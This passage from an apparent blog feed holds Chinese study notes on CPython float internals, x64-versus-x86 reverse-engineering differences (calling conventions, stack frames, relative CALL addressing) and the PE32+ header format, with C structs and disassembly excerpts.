class="comment">/* nb_inplace_power */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_lshift */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_rshift */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_and */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_xor */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_or */</span></span><br><span class="line">    float_floor_div,    <span class="comment">/* nb_floor_divide */</span></span><br><span class="line">    float_div,          <span class="comment">/* nb_true_divide */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_floor_divide */</span></span><br><span class="line">    <span class="number">0</span>,                  <span class="comment">/* nb_inplace_true_divide */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由此，对象的行为是写在相关定义内部的</p><br><h5 id="序列型操作"><a href="#序列型操作" class="headerlink" title="序列型操作"></a>序列型操作</h5><p>泛化方式具象到特定对象的过程也是类似上述的过程，不赘述。</p><br><h5 id="关联型操作"><a href="#关联型操作" class="headerlink" title="关联型操作"></a>关联型操作</h5><p>泛化方式具象到特定对象的过程也是类似上述的过程，不赘述。</p><br><h4 id="本节相关的精彩面试题"><a href="#本节相关的精彩面试题" class="headerlink" title="本节相关的精彩面试题"></a>本节相关的精彩面试题</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pi = <span class="number">3.14</span></span><br><span class="line">r = <span class="number">2</span></span><br><span class="line">area = pi * r ** <span class="number">2</span></span><br><span class="line">area</span><br></pre></td></tr></table></figure><ul><li>上述代码是否存在临时变量的创建，怎么理解？<ul><li>存在临时变量创建，根据优先级，先进行半径r的平方计算，计算结果存放在临时变量tmp中，随后将tmp与pi做乘积运算，结果存放在area中。最后对临时变量进行销毁</li></ul></li><li>Python是如何优化这个问题的？<ul><li>python引入了空闲对象链表机制，临时对象tmp销毁后并不直接回收其资源，而是将其放入空闲对象链表（不满的话）<strong>越过了对象销毁部分</strong>，随后在下一次创建于tmp相同类型对象时直接从空闲对象链表中取出，<strong>越过了对象创建部分。</strong></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(f))</span><br><span class="line"><span class="keyword">del</span>(f)</span><br><span class="line">g = <span class="built_in">float</span>(<span class="string">&#x27;3.14&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(g))</span><br></pre></td></tr></table></figure><ul><li>上述代码中变量f、g的地址一致，这是为什么？<ul><li>f销毁时，对象被放入空闲对象链表头，g创建时，由于对象类型和f一致，从对应类型的空闲对象链表中取出使用，取出的正好是刚刚放入的f，因此指向的地址一致。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python源码剖析 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核原理No.17--x64_Processor</title>
      <link href="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/"/>
      <url>/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/</url>
      
        <content type="html"><![CDATA[<p>学习完PE格式在32bit OS和64bit OS的差异之后，本节探讨64bit &amp; 32bit处理器在逆向工程中一些需要了解的差异性，方便在你想过程中根据实际场景做分析思路的变动。</p><br><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>32位系统和64位系统有什么区别？ 32位和64位表示CPU一次能处理的最大位数，理论上来说，64位系统处理的数据效率比32位更高，相当于单车道和双车道开车似得，双车道单位时间可以有更多的车辆通行。 但需要内存跟上，而且程序本身也是64位编译才能发挥64位系统的优势。</p><p>那么问题来了32位编译的程序 &amp; 64位编译出来的程序有些什么需要掌握的差异呢？</p><br><h3 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h3><h4 id="CALL｜JMP指令"><a href="#CALL｜JMP指令" class="headerlink" title="CALL｜JMP指令"></a>CALL｜JMP指令</h4><p>32位的x86系统中，CALL&#x2F;JMP指令的使用形式为<strong>“地址 指令 CALL&#x2F;JMP”</strong></p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/1.png" class=""><p>注意到0x00401000 的FF15 XXXXXXXX指令用于调用API，其中XXXXXXXX位绝对地址，指向IAT区域的某个位置。这在x64中形式一致，但<strong>指令解析不同</strong>：</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/2.png" class=""><ul><li>首先在指令地址的部分，由x86中的4字节变为8个字节</li><li>X86中<code>FF15</code>之后跟的4个字节的绝对地址，若在64位中<strong>若也采取一样的操作则会造成指令长度的增加</strong>（根据64位处理器索引范围正常也应该是8字节），故为了避免指令长度的增加，64处理器在<code>FF15</code>后的内容也是采取4字节**，<code>不过为了兼容索引范围，将这四个字节的内容解析为相对地址</code>**，相对地址换算的过程：<code> 0x0000000100401000 FF15FA3F0000</code> 0x0000000100401000+3FFA+6 &#x3D; 0x0000000100405000，计算的是相对于当前指令地址的，指令地址➕偏移➕指令长度（6）</li></ul><blockquote><p>（PS：截图取自《逆向工程核心原理》书中内容）</p></blockquote><hr><br><h4 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定*"></a>函数调用约定*</h4><h5 id="32bit-os"><a href="#32bit-os" class="headerlink" title="32bit os"></a>32bit os</h5><p>32位下的函数调用包含：<code>cdecl </code>、<code>stdcall</code>、<code>fastcall</code></p><p><strong>cdecl方式：</strong><code>C/C++默认方式</code>，参数从右往左依次入栈，主调函数负责栈平衡</p><p><strong>stdcall方式：</strong><code>Windows API默认方式</code>，参数从右往左依次入栈，被调函数负责栈平衡</p><p><strong>fastcall方式：</strong>这种方式<strong>优先选择将参数传入ECX，EDX</strong>，多的参数从右往左依次入栈，由于栈位于内存区域，寄存器则是硬件存取，故称fastcall</p><br><h5 id="64bit-os"><a href="#64bit-os" class="headerlink" title="64bit os"></a>64bit os</h5><p>在64位系统中将他们归为一种<strong>变形后的fastcall</strong>，至多可将4个参数存储到寄存器中传递</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/3.png" class=""><p>若参数个数超过4个，则从第五个开始会存入栈中，此外函数返回时传递参数过程中使用的栈由调用者清理。ps：尽管函数前四个参数由寄存器传递，可在栈中依旧会保留着四个参数对应的空间。（32bytes）</p><hr><br><h4 id="栈-amp-栈桢"><a href="#栈-amp-栈桢" class="headerlink" title="栈&amp;栈桢"></a>栈&amp;栈桢</h4><p>（这块理解还不是很深）</p><p>64bit OS中栈的大小比函数实际使用的空间要大得多。<strong>在调用子函数（Sub Function）时，不再使用PUSH命令来传递参数，而是通过<code>MOV指令</code>操作寄存器与预定的栈位置来传递。</strong></p><p>使用**VC++**创建的x64程序代码中几乎看不到PUSH&#x2F;POP指令，并且创建栈桢时也不再使用RBP寄存器，而是直接使用RSP，优点是：调用子函数时不需要改变栈指针（RSP），函数返回时也不需要清理栈指针，如此可大幅提升程序的运行速度。</p><p>处于深化对二者不同的理解，将如下源代码编译成不同的版本可执行程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hFile = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">    hFile = CreateFileA(<span class="string">&quot;c:\\work\\ReverseCore.txt&quot;</span>,    <span class="comment">// 1st - (string)</span></span><br><span class="line">                        GENERIC_READ,                   <span class="comment">// 2nd - 0x80000000</span></span><br><span class="line">                        FILE_SHARE_READ,                <span class="comment">// 3rd - 0x00000001</span></span><br><span class="line">                        <span class="literal">NULL</span>,                           <span class="comment">// 4th - 0000000000</span></span><br><span class="line">                        OPEN_EXISTING,                  <span class="comment">// 5th - 0x00000003</span></span><br><span class="line">                        FILE_ATTRIBUTE_NORMAL,          <span class="comment">// 6th - 0x00000080</span></span><br><span class="line">                        <span class="literal">NULL</span>);                          <span class="comment">// 7th - 0x00000000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( hFile != INVALID_HANDLE_VALUE )</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h5 id="32bit-version"><a href="#32bit-version" class="headerlink" title="32bit version"></a>32bit version</h5><p>前边提到32位系统下，调用windows API默认使用的stdcall方式，并且栈由被调用API处理。<strong>这里需要关注的过程是API调用过程中的32位调用特征：一是栈桢的设置，二是函数的参数使用过程中栈的清理方。</strong></p><p><strong>main函数的入口在0x0040116A特征是main需要三个参数，找到连续三个push</strong>，在此之前的指令是系统在设置程序需要的环境，只有完成这一步，才能由main接管程序执行，否则会出现程序致命性错误。</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/4.png" class=""><p>跟进main里边</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/5.png" class=""><p>首先可以看到指令地址还是属于用户区域的，另外API CreateFIleA是ascii的版本，所用的7个参数都使用栈来传递。</p><p>push指令进行过后的栈情况</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/6.png" class=""><p>跟进0x00401017，来到0x765D3F40，该区域不属于用户区，是核心区</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/7.png" class=""><p>跟进</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/8.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">75E2F9D2    55              push ebp</span><br><span class="line">75E2F9D3    8BEC            mov ebp,esp</span><br><span class="line">;这是在设置栈桢的指令，这是关注点一</span><br></pre></td></tr></table></figure><p>接着后边的指令调用了CreateFileW API这是unicode版本，参数一致，还是那7个，不同的是存储方式使用unicode</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/9.png" class=""><p>并且相比第一次入栈的方式不同，这里使用的是第一次入栈后用栈桢来定位的，ss:[ebp+0xXX]，运行至0x0075E2F9FC，观察栈的情况：</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/10.png" class=""><p>随后在API进行retn前有个leave指令，用于清理栈，恢复栈桢到调用函数前的状态</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/11.png" class=""><hr><br><h5 id="64bit-version"><a href="#64bit-version" class="headerlink" title="64bit version"></a>64bit version</h5><p>Windbg 64bit下的视图：</p><img src="/2022/05/14/%E9%80%86%E6%A0%B8%E5%8E%9F%E7%90%86No-17-x64-Processor/12.png" class=""><p>从CreateFile API的位置看得到栈桢操作并不是32bit下的操作ebp的方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;32bit OD下视图</span><br><span class="line">75E2F9D2    55              push ebp</span><br><span class="line">75E2F9D3    8BEC            mov ebp,esp</span><br></pre></td></tr></table></figure><p>64bit是直接操作RSP栈顶指针的，使用<code>sub rsp, 48h</code> 开辟的栈空间大小是48H，也就是72bytes，在函数retn前使用平栈操作 <code>add rsp, 48h</code> ，在观察传参的行为：<code>xor r9d,r9d</code> 清空r9寄存器的低四字节内容。</p><p>ps：64处理器中对于通用寄存器R8-R15，使用在寄存器后加flag标识高低位，b表示一字节，w表示二字节，d表示四字节。</p><p>从入栈的位置可以看出即使前四个参数使用寄存器传递，但栈中依旧保留了空间，rsp～rsp+20h</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.16--PE32+</title>
      <link href="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/"/>
      <url>/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/</url>
      
        <content type="html"><![CDATA[<p>PE格式在64位系统下的格式为PE32+，相比之下做了一些变动，主要是为了向下兼容PE32格式，以及适应内存空间的变动所做出的的修正。本节内容在于学习PE32+格式。</p><blockquote><p>PE32+是64位windows os 使用的可执行文件格式。</p><p>Windows OS 64bit中进程的虚拟内存为16TB，其中低8TB分配给用户模式，高8TB分给内核模式（因此可以根据指令地址判断程序所位于的区域），为了适应改变后的虚拟内存，原PE文件格式（PE32）做了修改，称为PE32+</p></blockquote><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/1.png" class=""><hr><h3 id="IMAGE-NT-HEADERS"><a href="#IMAGE-NT-HEADERS" class="headerlink" title="IMAGE_NT_HEADERS"></a>IMAGE_NT_HEADERS</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32bit</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">  DWORD                   Signature;</span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line"></span><br><span class="line"><span class="comment">//64bit</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">  DWORD                   Signature;</span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_NT_HEADERS64</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_NT_HEADERS64</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_NT_HEADERS32</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_NT_HEADERS32</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><blockquote><p>PE32+使用IMAGE_NT_HEADERS64结构体，而PE32使用的是IMAGE_NT_HEADERS32结构体，二者的区别在于第三个成员OptionalHeader的结构体类型是IMAGE_OPTIONAL_HEADER32还是IMAGE_OPTIONAL_HEADER64。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_NT_HEADERS64</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_NT_HEADERS64</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_NT_HEADERS32</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_NT_HEADERS32</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>上述代码是与处理过程，根据系统的类型，将重定义为合适的IMAGE_NT_HEADERS结构体</p></blockquote><h4 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h4><h6 id="IMAGE-FILE-HEADER-Machine"><a href="#IMAGE-FILE-HEADER-Machine" class="headerlink" title="IMAGE_FILE_HEADER.Machine"></a>IMAGE_FILE_HEADER.Machine</h6><p>该字段标识CPU类型，还有更多的字段值</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/2.png" class=""><p><strong>IMAGE_OPTIONAL_HEADER</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER32</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;</span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  DWORD                BaseOfData;</span><br><span class="line">  DWORD                ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;</span><br><span class="line">  DWORD                FileAlignment;</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  DWORD                SizeOfStackReserve;</span><br><span class="line">  DWORD                SizeOfStackCommit;</span><br><span class="line">  DWORD                SizeOfHeapReserve;</span><br><span class="line">  DWORD                SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line"> WORD        Magic;</span><br><span class="line"> BYTE        MajorLinkerVersion;</span><br><span class="line"> BYTE        MinorLinkerVersion;</span><br><span class="line"> DWORD       SizeOfCode;</span><br><span class="line"> DWORD       SizeOfInitializedData;</span><br><span class="line"> DWORD       SizeOfUninitializedData;</span><br><span class="line"> DWORD       AddressOfEntryPoint;</span><br><span class="line"> DWORD       BaseOfCode;</span><br><span class="line"> ULONGLONG   ImageBase;</span><br><span class="line"> DWORD       SectionAlignment;</span><br><span class="line"> DWORD       FileAlignment;</span><br><span class="line"> WORD        MajorOperatingSystemVersion;</span><br><span class="line"> WORD        MinorOperatingSystemVersion;</span><br><span class="line"> WORD        MajorImageVersion;</span><br><span class="line"> WORD        MinorImageVersion;</span><br><span class="line"> WORD        MajorSubsystemVersion;</span><br><span class="line"> WORD        MinorSubsystemVersion;</span><br><span class="line"> DWORD       Win32VersionValue;</span><br><span class="line"> DWORD       SizeOfImage;</span><br><span class="line"> DWORD       SizeOfHeaders;</span><br><span class="line"> DWORD       CheckSum;</span><br><span class="line"> WORD        Subsystem;</span><br><span class="line"> WORD        DllCharacteristics;</span><br><span class="line"> ULONGLONG   SizeOfStackReserve;</span><br><span class="line"> ULONGLONG   SizeOfStackCommit;</span><br><span class="line"> ULONGLONG   SizeOfHeapReserve;</span><br><span class="line"> ULONGLONG   SizeOfHeapCommit;</span><br><span class="line"> DWORD       LoaderFlags;</span><br><span class="line"> DWORD       NumberOfRvaAndSizes;</span><br><span class="line"> IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC0x10b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC0x20b</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_OPTIONAL_HEADER64</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_OPTIONAL_HEADER64  </span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_OPTIONAL_HEADER32</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_OPTIONAL_HEADER32</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>首先是代码末端根据系统表示重定义optionalheader的类型，分别指向IMAGE_OPTIONAL_HEADER64以及IMAGE_OPTIONAL_HEADER32，相应的结构体指针也发生变化。</p><hr><br><h4 id="IMAGE-OPTIONAL-HEADER"><a href="#IMAGE-OPTIONAL-HEADER" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a>IMAGE_OPTIONAL_HEADER</h4><h6 id="IMAGE-OPTIONAL-HEADER-Magic"><a href="#IMAGE-OPTIONAL-HEADER-Magic" class="headerlink" title="IMAGE_OPTIONAL_HEADER.Magic"></a>IMAGE_OPTIONAL_HEADER.Magic</h6><p>该字段值由PE32的0x010B，变为0x020B。Windows PE装载器根据该字段来区分IMAGE_OPTIONAL_HEADER结构体是32位还是64位的。</p><br><h6 id="IMAGE-OPTIONAL-HEADER-BaseOfData"><a href="#IMAGE-OPTIONAL-HEADER-BaseOfData" class="headerlink" title="IMAGE_OPTIONAL_HEADER.BaseOfData"></a>IMAGE_OPTIONAL_HEADER.BaseOfData</h6><p>PE32文件中该字段用于指示数据节的起始地址（RVA），而PE32+则删除了该字段</p><br><h6 id="IMAGE-OPTIONAL-HEADER-ImageBase"><a href="#IMAGE-OPTIONAL-HEADER-ImageBase" class="headerlink" title="IMAGE_OPTIONAL_HEADER.ImageBase"></a>IMAGE_OPTIONAL_HEADER.ImageBase</h6><blockquote><p>该字段的数据类型由原来的双字（DWORD）变为ULONGLONG类型（8个字节）这是为了适配增大的进程虚拟内存。借助此字段设置的大小，PE32+文件能够加载到64bit进程的虚拟内存空间（16TB）的任何位置（EXE&#x2F;DLL文件被加载到低位的8TB用户区域，SYS文件被加载到高位的8TB内核区域）</p></blockquote><p>PS：</p><blockquote><p>AddressOfEntryPoint、SizeOfImage等字段的大小与原PE32位是一样的，都是DWORD大小，这些字段的数据类型都是DOWRD，意味着PE32+格式文件的占用实际虚拟内存中，各映像的大小最大为4GB（32位）。但是由于ImageBase的大小为8个字节，程序文件能够载入到进程虚拟内存的任意地址位置。</p></blockquote><br><h6 id="IMAGE-OPTIONAL-HEADER中的堆和栈"><a href="#IMAGE-OPTIONAL-HEADER中的堆和栈" class="headerlink" title="IMAGE_OPTIONAL_HEADER中的堆和栈"></a>IMAGE_OPTIONAL_HEADER中的堆和栈</h6><p>在IMAGE_OPTIONAL_HEADER中关于堆和栈的相关字段（SizeOfStackReserve、SizeOfStackCommit、SizeOfHeapReserve、SizeOfHeapCommit）的数据类型变为ULONGLONG类型，这也是适配增大的虚拟内存空间作出的修正。</p><hr><h4 id="IMAGE-THUNK-DATA"><a href="#IMAGE-THUNK-DATA" class="headerlink" title="IMAGE_THUNK_DATA"></a>IMAGE_THUNK_DATA</h4><p>IMAGE_THUNK_DATA位于OptionalHeader.DataDirectory[1]中的存放有导入表存放的位置（RVA）以及导入表大小（Size）的结构体IMAGE_DIRECTORY_ENTRY_IMPORT其中VirtualAddress指向的导入表信息结构体IMAGE_IMPORT_DESCRIPTOR，其中OriginalFirstThunk（IAT）存放的导入具体信息。不是很清楚这段的可以看看开头PO出来的结构图</p><p>IMAGE_THUNK_DATA结构体大小由原来的4字节变为8个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA64</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONGLONG ForwarderString;  <span class="comment">// PBYTE </span></span><br><span class="line">        ULONGLONG Function;         <span class="comment">// PDWORD</span></span><br><span class="line">        ULONGLONG Ordinal;</span><br><span class="line">        ULONGLONG AddressOfData;    <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; 